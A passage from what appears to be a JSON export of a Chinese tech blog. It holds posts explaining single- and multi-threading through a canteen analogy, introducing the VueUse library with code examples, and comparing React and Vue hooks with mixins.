的部署方式，不管是部署在自己的機房主機或雲端，大家可以在挑選合適的解決方案，Nitro 也支援無伺服器 (Serverless) 等部署方式非常的方便，只是要特別注意到 Serverless 執行一些 binary 的問題，再挑選自己適合的部署與服務方式。\n經過本篇文章，大家應該都對於 Nuxt 3 有初步的理解，接下來下一篇文章我們將會進入實戰練習，將會以 Nuxt 3 來實作一個部落格網站！\n","date":"2023-01-14T00:00:00Z","image":"https://live.staticflickr.com/65535/52616698791_b7b8bbce05_o.jpg","permalink":"https://wayneblog.ga/2023-01-14/nuxt-try-nuxt3/","title":"【Nuxt3】開箱即用的 Nuxt3 玩轉筆記"},{"content":" 參考網站\n參考網站\n以生活例子說明單線程與多線程。\n程序設計的目標 在我看來單從程序的角度來看，一個好的程序的目標應該是性能與用戶體驗的平衡。當然一個程序是否能夠滿足用戶的需求暫且不談，這是業務層面的問題，我們僅僅討論程序本身。圍繞兩點來展開，性能與用戶體驗。\n性能：高性能的程序應該可以等同於CPU的利用率，CPU的利用率越高(一直在工作，沒有閒下來的時候)，程序的性能越高。 體驗：這裏的體驗不只是界面多麼漂亮，功能多麼順手，這裏的體驗指程序的響應速度，響應速度越快，用戶體驗越好。 下面我們就這兩點進行各種模型的討論。\n單線程多任務無阻塞 以生活中食堂打飯的場景作爲比喻，假設有這樣的場景，小A，小B，小C 在窗口依次排隊打飯。\n假設窗口負責打飯的阿姨打一個菜需要耗時1秒。如果小A需要2個菜，小B需要3個菜，小C需要2個菜。如下：\n阿姨(CPU)：打一個菜需要1秒 小A：2個菜 小B：3個菜 小C：2個菜 那麼在這種模型下將所有服務做完阿姨需要耗時 2 + 3 + 2 = 7秒\n阿姨 = CPU，小A、小B、小C = 任務(這裏是以任務爲概念，表示需要做一些事情)\n這種模型下CPU是滿負荷不間斷運轉的，沒有空閒，用戶體驗還不錯。\n這種程序中每個任務的耗時都比較小，是非常理想的狀態，一般情況下基本不太可能存在。\n單線程多任務IO阻塞 將上面的場景稍微做改動：\n阿姨：打一個菜需要1秒 小A：2個菜，但是忘記帶錢了，要找同學送過來，估計需要等5分鐘可以送到(可以理解爲磁盤IO) 小B：3個菜 小C：2個菜 這種情況下小A這裏發生了阻塞，實際上小A這裏耗費了5分鐘也就是 300秒 + 2個菜的時間，也就是302秒，而CPU則空閒了300秒，實際上工作2秒。\n所有服務做完花費 302 + 3 + 2 = 307秒，CPU實際工作7秒，等待300秒。極大浪費了CPU的時鐘週期。\n用戶體驗很差，因爲小A阻塞的時候，後面的所有人都等着，而實際上此時CPU空閒。所以單線程中不要有阻塞出現。\n單線程多任務異步IO 還是上面的模型，加入一個角色：值日生小哥，他負責事先詢問每一個人是否帶錢了，如果帶錢了則允許打菜，否則把錢準備好了再說。\n值日生小哥問小A準備好打菜了嗎，小A說忘帶錢了，值日生小哥說，你把錢準備好了再說，小A開始準備(需要300秒，從此刻開始記時)。 值日生小哥問小B準備好打菜了嗎，小B說可以了，阿姨服務小B，耗時3秒。 值日生小哥問小C準備好打菜了嗎，小C說可以了，阿姨服務小C，耗時2秒。 值日生小哥問小A準備好了沒有，小A說還要等一會，阿姨由於沒有人過來服務，處於空閒狀態。 300秒之後，小A準備好了，阿姨服務小A，耗時2秒。 整個過程做完耗時 300 + 2 = 302秒，CPU工作7秒，空閒295秒。\n值日生小哥相當於select模型中的select功能，負責輪詢任務是否可以工作，如果可以則直接工作，否則繼續輪詢。\n在小A阻塞的300秒裏面，阿姨(CPU)沒有傻等，而是在服務後面的人，也就是小B和小C，所以這裏與模型3不同的是，這裏有5秒CPU是工作的。\n如果打飯的人越多，這種模型CPU的利用率越高，例如如果有小D，小E，小F\u0026hellip;等需要服務，CPU可以在小A阻塞的300秒期間內繼續服務其他人。實際上值日生小哥輪詢也會耗時，這個耗時是很少的，幾乎可以忽略不計，但是如果任務非常多，這個輪詢還是會影響性能的，但是epoll模型已經不使用輪詢的方式，相當於A，B，C會主動跟值日生小哥報告，說我準備好了，可以直接打菜了。\n這種模式下用戶體驗好，CPU利用率高(任務越多利用率越高)\n單線程多任務，有耗時計算 回到最開始的模型，如下：\n阿姨：打一個菜需要1秒 小A：200個菜 小B：3個菜 小C：2個菜 順序做完所有任務，需要耗時 200 + 3 + 2 = 205秒，CPU無空閒，但是用戶體驗卻不是很好，因爲顯然後面的 B、C 需要等待小A 200秒的時間，這種情況下是沒有IO阻塞的，但是任務A本身太耗CPU了，所以說如果單線程出現了耗時的操作，一定會影響體驗(IO操作或者是耗時的計算都屬於耗時的操作，都會導致阻塞，但是這兩種導致阻塞的性質是不一樣的)。\n在所有的單線程模型中都不允許出現阻塞的情況，如果出現，那麼用戶體驗是極差的，例如在UI編程中(QT、C# Winform)是不允許在UI線程中做耗時的操作的，否則會導致UI界面無響應。 編寫Nodejs程序的時候，我們所寫的代碼實際上是在一個線程中執行的，所以也不允許有阻塞的操作(當然整個Nodejs框架實現異步，一定不止一個線程)。\n出現阻塞的情況一般有2種，一種是IO阻塞，例如典型的如磁盤操作，這種情況下的阻塞會導致CPU空閒等待(當然現代操作系統中如果IO阻塞，操作系統一定會將導致IO阻塞的線程掛起)。這種阻塞的情況，可以通過異步IO的方法避免，這樣就避免程序中僅有的單線程被操作系統掛起。另一種情況下是確實有非常多的計算操作，例如一個複雜的加密算法，確實需要消耗非常多的CPU時間，這種情況下CPU並不是空閒的，反而是全負荷工作的。\n這種CPU密集的工作不適合放在單線程中，雖然CPU的利用率很高，但是用戶體驗並不是很好。這種情況下使用多線程反而會更好，例如如果3個任務，每個任務都在一個線程中，也就是有3個線程，A任務在ThreadA中，B任務在ThreadB中，C任務在ThreadC中，那麼即使A任務的計算量比較大，B，C兩個任務所在的線程也不必等待A任務完成之後再工作，他們也有機會得到調度，這是由操作系統來完成的。這樣就不會因爲某一個任務計算量大，而導致阻塞其他任務而影響體驗了。\n多線程程序 我們將上面的模型改造成多線程的模型是怎樣的呢，我們在模型5的基礎上添加一個角色，管理員大叔(操作系統的角色)：\n阿姨：打一個菜需要1秒 小A：200個菜 小B：3個菜 小C：2個菜 加入管理員大叔之後變成這樣的了，小A打兩個菜之後，大叔說，你打的菜太多了，不能因爲你要打200個菜，讓後面的同學都沒有機會打菜，你打兩個菜之後等一會，讓後面的同學也有機會。\n大叔讓小B打兩個菜，然後讓小C打兩個菜(小C完成)，然後再讓小A打兩個菜(完成之後小A總共就有4個菜了)，再讓小B打1個菜(此時小B總共打3個菜，完成)，然後小A打剩下的196個菜。\nCPU的利用率：很高，阿姨在不斷的工作。\n用戶體驗：不錯，即使小A要打200個菜，小B，小C也有機會；當然如果小A說我是幫校長打菜，要快一點(線程優先級高)，那也只能先把小A服務完。\n總耗時： 200 + 3 + 2 + (大叔指揮安排所消耗的時間，包括從小C切換回小A的時候，大叔要知道小A上次打的菜是哪兩個，這次應該接着打什麼菜，這相當於線程上下文切換的開銷以及線程環境的保存與恢復)，所以並不是線程越多越好，線程非常多的時候大叔估計會焦頭爛額吧，要記住這麼狀態，切換來切換去也耗時間。\n這種模型下實際上是將小A的耗時任務，分成多份去執行而不是集中執行，所以小A要完成他的任務，可能需要更多的時間(期間他也需要等別人，阿姨不會一直爲他一個人服務，但是阿姨爲他服務的時間是沒有變化的)，這種其實有點以時間換取用戶體驗(小B和小Ｃ的體驗，小Ａ的體驗可能就不會那麼好了，但是小Ａ本來也非常耗時，所以多等一會是不是也沒關係)。\n那麼IO阻塞和CPU計算耗時阻塞這兩者有什麼區別呢？\n區別在於IO阻塞是不使用CPU的，而CPU計算耗時導致的阻塞是會使用CPU的。\n例如上面的例子中，小A說忘記帶錢了需要同學送錢，於是小A等着同學送錢過來，這個過程中阿姨並沒有爲小A提供服務，這個過程中爲小A提供服務的是他的同學(送錢過來)，實際上小A的同學相當於現代計算機系統中的DMA(直接內存操作)，小A同學送錢的過程相當於DMA從磁盤讀取數據到內存的過程，這個過程基本不需要CPU干預。\n當然在DMA技術還沒有出現的年代，從磁盤讀取文件也是需要CPU發送指令去讀取的，也就是說需要CPU的計算，應用到這裏的場景中，就是阿姨親自跑一趟幫小A把錢拿過來。\n多CPU 多CPU是一個更加複雜的問題，多CPU如何調度？小A在第一個窗口打兩個菜，又跑到第二個窗口打兩個菜這種情況如何處理？\n小A在第一個窗口，小B在第二個窗口他們要同一個菜，但是這個菜只夠一個人，那麼兩個窗口阿姨如何分配這種需求(實際上應該是由操作系統也就是管理員大叔來決定如何分配，也就是多核下的線程同步與互斥)？\n多核CPU情況下，多線程的調度、互斥、鎖與同步相對來講更加複雜，多核情況下是真正的並行，同一時刻有多個線程在同時運行，他們的競爭怎麼處理，多個CPU之間如何同步(多CPU之間的緩存狀態一致性)等等一系列的問題。\n多線程與多進程 上面描述的多線程實際上是討論的是多線程的調度問題，這裏我們說一說多線程與多進程與資源的分配問題。什麼意思呢，一群人(多個線程)在一個桌子(進程)上吃飯，他們會涉及到一些問題，比如多個人可能會夾一個菜(競爭)，A和B同時看到盤子裏面有一塊肉，同時伸出筷子去夾，A先夾走，B遲了一點伸到盤子的時候已經沒了，只能縮回來(臨界資源，互斥)，有一個點心需要用饃夾肉一起吃。A夾了肉，B夾了饃，A需要B的饃，B需要A的肉，他們僵持不下誰都不讓步(死鎖)。\n多線程之間的資源共享是非常方便的，因爲他們共用進程的資源空間(在一個桌子上)，但是需要注意一系列的問題：競爭、死鎖、同步\u0026hellip;等。如果在旁邊再開一個桌子(進程)。 那麼桌子之間講話，遞東西又不方便(進程間通信)，而開一個桌子的開銷比在一個桌子上多加一個人的開銷要大。另外一個桌子上的人數不可能無限制增加，桌子的容量有限也坐不下這麼多人(進程的線程句柄是有限制的)。一個桌子壞了不會影響到另一個桌子上面人的就餐情況(進程間相互DuLi，一個進程崩潰不會影響另一個)，而一個桌子上的某人喝掛了需要送醫院，估計這一桌人都要散了(線程掛掉會導致整個進程也掛掉)。所以多線程與多進程是各有優缺點，不能一概而論。\n總結 單線程程序：適合IO異步，不能阻塞，不能有大量耗CPU的計算，典型如Nodejs，還有一些網絡程序。\n","date":"2023-01-07T00:00:00Z","image":"https://live.staticflickr.com/65535/52611539777_c564013cbd_o.png","permalink":"https://wayneblog.ga/2023-01-07/single-multi-thread/","title":"以生活的例子說明單線程和多線程"},{"content":" 參考網站\n參考網站\nVueUse 是什麼？ VueUse 作者為 Anthony Fu，是一款基於 Vue 組合式 API (Composition API) 的函數工具集，其中 VueUse 主要特色可以分為以下幾點：\nVue 2 和 Vue 3 都支援 採取 Tree Shaking 結構，只會打包引入的程式碼 支持各種套件 可配置事件過濾器和目標 以上是官方網站關於它的定義。\n首先，它基於 Vue Composition API (組合式API)，只有在支持組合式 API 的環境下，才可以正常使用它。\n什麼是組合式 API？\n然後，它是一款函數工具集(可類比為 lodash.js / ramda.js)\n簡單來說，這是一個能讓你更早下班的工具庫。\nVueUse 開源嗎？現狀如何？ 當然開源！ github/vueuse\n社區活躍度：社區非常活躍，截止 2021 年 11 月，一直有 mr 被合入主線。\n被引用情況：截止 2021 年 11 月 13 日，npm 上可查詢到依賴它的庫就有 172 個，其中包括著名UI庫：Element-Plus\nVue 的著名開源作者 Evan You 也是此庫的金牌贊助商。\n安裝 VueUse NPM 或 YARN：\n1 2 3 npm i @vueuse/core # or yarn add @vueuse/core CDN 引入：\n這邊注意 shared 一定要在前面\n1 2 \u0026lt;script src=\u0026#34;https://unpkg.com/@vueuse/shared\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://unpkg.com/@vueuse/core\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 注：VueUse 借助 vue-demi 的強大功能，可以在一個包中同時適用於 Vue 2、3！\nVue 3 Demo\n使用 Vite 使用 Webpack Vue 2 Demo (Vue CLI)\n使用 Vue CLI 另外，要注意庫的版本：\n從 v6.0 版本起，vue3 需要 vue \u0026gt;= v3.2，vue2 需要依賴 @vue/composition-api：@vue/composition \u0026gt;= v1.1。\nVueUse 能做什麼？ 能做的那可太多了，但總體上分為以下幾個類別提供工具函數：\nAnimation 動畫 Browser 瀏覽器 Component 組件 Formatters 格式化 Sensors 傳感器 State 狀態機 Utility 實用方法 Watch 監聽 Misc 各式各樣的雜項 這麼列了一遍，估計你還是很懵，但因為方法實在太多，也不可能一個個都列出來。\n那我就舉幾個有代表性的例子，帶你快速理解這些方法大概是做什麼的，有什麼特點。\n例子(一)：useMouse 1 2 3 4 5 6 7 8 9 \u0026lt;template\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Mouse: {{x}} x {{y}}\u0026lt;/h3\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup lang=\u0026#34;ts\u0026#34;\u0026gt; import { useMouse } from \u0026#39;@vueuse/core\u0026#39; const { x, y } = useMouse() \u0026lt;/script\u0026gt; 效果：\nWooooow~~~ 這可太簡單易用了！\n經過源碼閱讀，我們可以發現，這短短的一個方法，至少做了以下這些事：\n創建了 x 和 y 這兩個響應式對象(Ref) 給 window 添加了鼠標事件監聽，將鼠標的坐標實時賦給 x、y (並且還做了移動端兼容) 如果這些邏輯放到頁面裡，至少需要 6 行代碼，這些代碼後期都會增加維護人員理解頁面的成本，而現在，你只需要一行代碼。\n除此之外，該方法還有組件式用法，適合更熱愛標籤的盆友\n1 2 3 4 \u0026lt;UseMouse v-slot=\u0026#34;{ x, y }\u0026#34;\u0026gt; x: {{ x }} y: {{ y }} \u0026lt;/UseMouse\u0026gt; 例子(二)：useInterval 顧名思義，這個方法是對延时重複調用能力的封裝。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;script setup lang=\u0026#34;ts\u0026#34;\u0026gt; import { useInterval } from \u0026#39;.\u0026#39; const { counter, pause, resume } = useInterval(200, { controls: true }) // counter 一個 Ref 對象，它是響應式的，counter.value 等於已經計算的次數 // pause() 暫停 // resume() 恢復 \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;div id=\u0026#34;APP\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Interval fired: {{ counter }}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 效果：\n是不是很好用？相比手寫 setInterval 更為便捷。\n如果徒手實現這樣一整套方法，多少行暫且不說，我們需要在業務中寫下大量的邏輯代碼。\n而眾所周知：\n寫的代碼越多，出 Bug 的可能性越大，維護和理解的難度就越高。從這個角度看，這個庫確實是一個合格的函數工具集。\n例子(三)：useClipboard 以複製文字為例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;script setup\u0026gt; import { useClipboard } from \u0026#39;@vueuse/core\u0026#39;; // 只需要引入所使用到的 API import { ref } from \u0026#39;vue\u0026#39; const input = ref(\u0026#39;我是 Winnie\u0026#39;) const { text, // 複製的值 isSupported, // 瀏覽器有無支援 copy, // 方法 copied } = useClipboard() \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;div v-if=\u0026#34;isSupported\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;useClipboard\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;複製內容：{{ input }}\u0026lt;/p\u0026gt; \u0026lt;input v-model=\u0026#34;input\u0026#34; /\u0026gt; \u0026lt;a @click=\u0026#34;copy(input)\u0026#34;\u0026gt;{{ copied ? \u0026#34;已複製\u0026#34; : \u0026#34;複製\u0026#34; }}\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;p v-else\u0026gt;Your browser does not support Clipboard API\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; 效果：\n例子(四)：useVModel 這是一個給經常封裝組件的小伙伴們的大好利器。\n先創建一個組件：Test.vue\nTest.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; name: \u0026lt;input v-model=\u0026#34;_name\u0026#34;/\u0026gt; age: \u0026lt;input v-model=\u0026#34;_age\u0026#34;/\u0026gt; sex: \u0026lt;input v-model=\u0026#34;_sex\u0026#34;/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34; setup\u0026gt; import { useVModel } from \u0026#39;@vueuse/core\u0026#39; const props = defineProps({ name: String, age: String, sex: String }) const emit = defineEmits([\u0026#39;update:name\u0026#39;, \u0026#39;update:age\u0026#39;, \u0026#39;update:sex\u0026#39;]) const _name = useVModel(props, \u0026#39;name\u0026#39;, emit) const _age = useVModel(props, \u0026#39;age\u0026#39;, emit) const _sex = useVModel(props, \u0026#39;sex\u0026#39;, emit) \u0026lt;/script\u0026gt; 接著，在 index.vue 中使用它\nindex.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;Test v-model:name=\u0026#34;formData.name\u0026#34; v-model:age=\u0026#34;formData.age\u0026#34; v-model:sex=\u0026#34;formData.sex\u0026#34; \u0026gt;\u0026lt;/Test\u0026gt; {{ formData }} \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup lang=\u0026#34;ts\u0026#34;\u0026gt; import { reactive } from \u0026#39;vue-demi\u0026#39;; import Test from \u0026#39;./Test.vue\u0026#39; const formData = reactive({ name: \u0026#39;lily\u0026#39;, age: \u0026#39;8\u0026#39;, sex: \u0026#39;boy\u0026#39; }) \u0026lt;/script\u0026gt; 效果：\n對於有組件封裝需求的朋友，這個方法強烈推薦！\n不用再為了單向數據流的組件封裝，而在組件內寫冗餘的代碼了。\n直接將 useVModel 返回的數據作為響應式對象用即可。\n最後 例子太多，就不再一一介紹了，但大家應該已經有了一個初步的概念，知道了此庫的作用，一言以蔽之：助力摸鱼，提前下班。\n它沒辦法做到你之前做不到的事情。\n它只能做到讓你更輕鬆的完成工作！願你今天也能按時下班。\n","date":"2022-12-30T00:00:00Z","image":"https://live.staticflickr.com/65535/52595409644_aa1fd7bf45_o.png","permalink":"https://wayneblog.ga/2022-12-30/npm-vueuse/","title":"【VueUse】一款基於 Vue Composition API 的函式工具集"},{"content":" 參考網站\n一、hooks：什麼叫大勢所趨？ 2019年年初，react 在 16.8.x 版本正式具備了 hooks 能力。\n2019年6月，尤雨溪在 vue/github-issues 裡提出了關於 vue3 Composition API 的提案。(vue hooks的基礎)\n在後續的 react 和 vue3 相關版本中，相關 hooks 能力都開始被更多人所接受。\n除此之外，solid.js、preact 等框架，也是開始選擇加入 hooks 大家庭。\n可以預見，雖然目前仍然是 class Component 和 hooks api 並駕齊驅的場面，但未來幾年裡，hooks 極有可能取代 class Component 成為業內真正的主流。\n二、什麼是 hooks？ hooks 的定義 hooks 直譯是\u0026quot;鉤子\u0026quot;，它並不僅是 react，甚至不僅是前端界的專用術語，而是整個行業所熟知的用語。\n通常指：\n系統運行到某一時期時，會調用被註冊到該時機的回調函數。\n比較常見的鉤子有：windows 系統的鉤子能監聽到系統的各種事件，瀏覽器提供的 onload 或 addEventListener 能註冊在瀏覽器各種時機被調用的方法。\n以上這些，都可以被稱一聲 hook。\n但是很顯然，在特定領域的特定話題下，hooks 這個詞被賦予了一些特殊的含義。\n在 react@16.x 之前，當我們談論 hooks 時，我們可能談論的是\u0026quot;組件的生命週期\u0026quot;。\n但是現在，hooks 則有了全新的含義。\n以 react 為例，hooks 是：\n一系列以 \u0026ldquo;use\u0026rdquo; 作為開頭的方法，它們提供了讓你可以完全避開 class 式寫法，在函數式組件中完成生命週期、狀態管理、邏輯複用等幾乎全部組件開發工作的能力。\n簡化一下：\n一系列方法，提供了在函數式組件中完成開發工作的能力。\n(記住這個關鍵詞：函數式組件)\n1 2 import { useState, useEffect, useCallback } from \u0026#39;react\u0026#39;; // 比如以上這幾個方法，就是最為典型的 Hooks 而在 vue 中，hooks 的定義可能更模糊，姑且總結一下：\n在 vue 組合式 API 裡，以 \u0026ldquo;use\u0026rdquo; 作為開頭的，一系列提供了組件複用、狀態管理\u0026hellip;等開發能力的方法。\n(關鍵詞：組合式API)\n1 2 3 import { useSlots, useAttrs } from \u0026#39;vue\u0026#39;; import { useRouter } from \u0026#39;vue-router\u0026#39;; // 以上這些方法，也是 vue3 中相關的 Hook！ 如：useSlots、useAttrs、useRouter 等。\n但主觀來說，我認為 vue 組合式 API 其本身就是 \u0026ldquo;vue hooks\u0026rdquo; 的關鍵一環，起到了 react hooks 裡對生命週期、狀態管理的核心作用。(如 onMounted、ref 等等)。\n如果按這個標準來看的話，vue 和 react 中 hooks 的定義，似乎都差不多。\n那麼為什麼要提到是以 \u0026quot;use\u0026quot; 作為開頭的方法呢？\n命名規範和指導思想 通常來說，hooks 的命名都是以 use 作為開頭，這個規範也包括了那麼我們自定義的 hooks。\n為什麼？\n在 react 官方文檔裡，對 hooks 的定義和使用提出了 一個假設、兩個只在 核心指導思想。\n一個假設：假設任何以「use」 開頭並緊跟著一個大寫字母的函數就是一個 Hook。\n第一個只在：只在 React 函數組件中調用 Hook，而不在普通函數中調用 Hook。(Eslint 通過判斷一個方法是不是大坨峰命名來判斷它是否是 React 函數)\n第二個只在：只在最頂層使用 Hook，而不要在循環、條件或嵌套函數中調用 Hook。\n因為約定的力量在於：我們不用細看實現，也能通過命名來了解一個它是什麼。\n以上 一個假設、兩個只在 總結自 react 官網：\nHook 的規則 Lint 規則究竟強制了些什麼？ 三、為什麼我們需要 hooks？ 更好的狀態複用 針對的就是你，mixin！\n在 class 組件模式下，狀態邏輯的複用是一件困難的事情。\n假設有如下需求：\n當組件實例創建時，需要創建一個 state 屬性：name，並隨機給此 name 屬性附一個初始值。除此之外，還得提供一個 setName 方法。你可以在組件其他地方取得和修改此狀態屬性。\n更重要的是：這個邏輯要可以複用，在各種業務組件裡複用這個邏輯。\n在擁有 Hooks 之前，我首先會想到的解決方案一定是 mixin。\n代碼如下：(此示例採用 vue2 mixin 寫法)\n1 2 3 4 5 6 7 8 9 10 11 12 13 // 混入文件：name-mixin.js export default { data() { return { name: genRandomName() // 假裝它能生成隨機的名字 } }, methods: { setName(name) { this.name = name } } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;!-- 组件：my-component.vue --\u0026gt; \u0026lt;template\u0026gt; \u0026lt;div\u0026gt;{{ name }}\u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import nameMixin from \u0026#39;./name-mixin\u0026#39;; export default { mixins: [nameMixin], // 通過 mixins，你可以直接獲得 nameMixin 中所定義的狀態、方法、生命周期中的事件...等 mounted() { setTimeout(() =\u0026gt; { this.setName(\u0026#39;Tom\u0026#39;) }, 3000) } } \u0026lt;/script\u0026gt; 粗略看來，mixins 似乎提供了非常不錯的複用能力，但是，react 官方文檔直接表明：\n為什麼呢？\n因為 mixins 雖然提供了這種狀態複用的能力，但它的弊端實在太多了。\n弊端一：難以追溯的方法與屬性！ 試想一下，如果出現這種代碼，你是否會懷疑人生：\n1 2 3 4 5 6 7 export default { mixins: [ a, b, c, d, e, f, g ], // 當然，這只是表示它混入了很多能力 mounted() { console.log(this.name) // 嗯...這個 this.name 來自於誰？我難道要一個個混入看實現？ } } 又或者：\n1 2 3 4 5 6 7 8 a.js mixins: [b.js] b.js mixins: [c.js] c.js mixins: [d.js] // 你猜猜看，this.name 來自於誰？ // 求求你别再說了，我血壓已经上来了 弊端二：覆蓋、同名？貴圈真亂！ 當我同時想混入 mixin-a.js 和 mixin-b.js 以同時獲得它們能力的時候，不幸的事情發生了：\n由於這兩個 mixin 功能的開發者惺惺相惜，它們都定義了 this.name 作為屬性。\n這種時候，你會深深懷疑，mixins 究竟是不是一種科學的複用方式。\n弊端三：梅開二度？代價很大！ 仍然說上面的例子，如果我的需求發生了改變，我需要的不再是一個簡單的狀態 name，而是分別需要 firstName 和 lastName。\n此時 name-mixin.js 混入的能力就會非常尷尬，因為我無法兩次 mixins 同一個文件。\n當然，也是有解決方案的，如：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // 動態生成 mixin function genNameMixin(key, funcKey) { return { data() { return { [key]: genRandomName() } }, methods: { [funcKey]: function(v) { this.[key] = v } } } } export default { mixins: [ genNameMixin(\u0026#39;firstName\u0026#39;, \u0026#39;setFirstName\u0026#39;), genNameMixin(\u0026#39;lastName\u0026#39;, \u0026#39;setLastName\u0026#39;), ] } 確實通過動態生成 mixin 完成了能力的複用，但這樣一來，無疑更加地增大了程序的複雜性，降低了可讀性。\n因此一種新的狀態邏輯複用，就變得極為迫切了——————它就是 Hooks！\nHook 的狀態複用寫法： 1 2 3 4 5 6 7 // 單個 name 的寫法 const { name, setName } = useName(); // 梅開二度的寫法 const { name: firstName, setName: setFirstName } = useName(); const { name: secondName, setName: setSecondName } = useName(); 相比於 mixins，它們簡直太棒了！\n方法和屬性好追溯嗎？這可太好了，誰產生的，哪兒來的一目了然。 會有重名、覆蓋問題嗎？完全沒有！內部的變量在閉包內，返回的變量支持定義別名。 多次使用，沒開 N 度？你看上面的代碼塊內不就 \u0026ldquo;梅開三度\u0026rdquo; 了嗎？ 就衝 狀態邏輯復用 這個理由，Hooks 就已經香得我口水直流了。\n代碼組織 熵減，宇宙哲學到編碼哲學。\n項目、模塊、頁面、功能，如何高效而清晰地組織代碼，這一個看似簡單的命題就算寫幾本書也無法完全說清楚。\n但一個頁面中，N 件事情的代碼在一個組件內互相糾纏確實是在 Hooks 出現之前非常常見的一種狀態。\n那麼 Hooks 寫法在代碼組織上究竟能帶來怎樣的提升呢？\n(假設上圖中每一種顏色就代碼一種高度相關的業務邏輯)\n無論是 vue 還是 react，通過 Hooks 寫法都能做到，將\u0026quot;分散在各種聲明周期裡的代碼塊\u0026quot;，通過 Hooks 的方式將相關的內容聚合到一起。\n這樣帶來的好處是顯而易見的：高度聚合，可閱讀性提升。伴隨而來的便是效率提升，bug變少。\n按照\u0026quot;物理學\u0026quot;裡的理論來說，這種代碼組織方式，就算是\u0026quot;熵減\u0026quot;了。\n比 class 組件更容易理解 尤其是 this。\n在 react 的 class 寫法中，隨處可見各種各樣的 .bind(this)。(甚至官方文檔裡也有專門的章節描述了\u0026quot;為什麼綁定是必要的？\u0026ldquo;這一問題)\nvue 玩家別笑，computed: { a: () =\u0026gt; { this } } 裡的 this 也是 undefined。\n很顯然，綁定雖然\u0026quot;必要\u0026rdquo;，但並不是\u0026quot;優點\u0026quot;，反而是\u0026quot;故障高發\u0026quot;地段。\n但在 Hooks 寫法中，你就完全不必擔心 this 的問題了。\n因為：\n本來無一物，何處惹塵埃。\nHooks 寫法直接告別了 this，從\u0026quot;函數\u0026quot;來，到\u0026quot;函數\u0026quot;去。\n媽媽再也不用擔心我忘記寫 bind 了。\n友好的漸進式 隨風潛入夜，潤物細無聲。\n漸進式的含義是：你可以一點點深入使用。\n無論是 vue 還是 react，都只是提供了 Hooks API，並將它們的優劣利弊擺在了那裡。並沒有通過無法接受的 break change 來強迫你必須使用 Hooks 去改寫之前的 class 組件。\n你依然可以在項目裡一邊寫 class 組件，一邊寫 Hooks 組件，在項目的演進和開發過程中，這是一件沒有痛感，卻悄無聲息改變著一切的事情。\n但是事情發展的趨勢卻很明顯，越來越多的人加入了 Hooks 和 组合式 API 的大軍。\n如何開始玩 hooks？ 環境和版本 在 react 項目中，react 的版本需要高於 16.8.0。\n而在 vue 項目中，vue3.x 是最好的選擇，但 vue2.6+ 配合 @vue/composition-api，也可以開始享受 \u0026ldquo;組合式 API\u0026rdquo; 的快樂。\nreact 的 Hooks 寫法 因為 react Hooks 僅支持 \u0026ldquo;函數式\u0026rdquo; 組件，因此需要創建一個函數式組件 my-component.js。\nmy-component.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import { useState, useEffect, useMemo } from \u0026#39;React\u0026#39; export default () =\u0026gt; { // 通過 useState 可以創建一個 狀態屬性 和一個 賦值方法 const [ name, setName ] = useState(\u0026#39;\u0026#39;) // 通過 useEffect 可以對副作用進行處理 useEffect(() =\u0026gt; { console.log(name) }, [ name ]) // 通過 useMemo 能生成一個依賴 name 的變量 message const message = useMemo(() =\u0026gt; { return `hello, my name is ${name}` }, [name]) return \u0026lt;div\u0026gt;{ message }\u0026lt;/div\u0026gt; } 細節可參考 react 官方網站\nvue 的 Hooks 寫法 vue 的 Hooks 寫法依賴於组合式API，因此本例採用 \u0026lt;script setup\u0026gt; 來寫：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; {{ message }} \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { computed, ref } from \u0026#39;vue\u0026#39; // 定義了一個 ref 對象 const name = ref(\u0026#39;\u0026#39;) // 定義了一個依賴 name.value 的計算屬性 const message = computed(() =\u0026gt; { return `hello, my name is ${name.value}` }) \u0026lt;/script\u0026gt; 很明顯，vue 組合式API 裡完成 useState 和 useMemo 相關工作的 API 並沒有通過 useXxx 來命名，而是遵從了 Vue 一脈相承而來的 ref 和 computed。\n雖然不符合 react Hook 定義的 Hook 約定，但 vue 的 api 不按照 react 的約定好像也並沒有什麼不妥。\n參考網址\n五、開始第一個自定義 hook 除了官方提供的 Hooks Api，Hooks 的另外一個重要特質，就是可以自己進行 \u0026ldquo;自定義 Hooks\u0026rdquo; 的定義，從而完成狀態邏輯的複用。\n開源社區也都有很多不錯的基於 Hooks 的封裝，比如 ahooks，又比如 VueUse\n那麼，我們應該怎麼開始撰寫 \u0026ldquo;自定義 Hooks\u0026rdquo; 呢？往下看吧！\nreact 玩家看這裡 react 官方網站就專門有一個章節講述 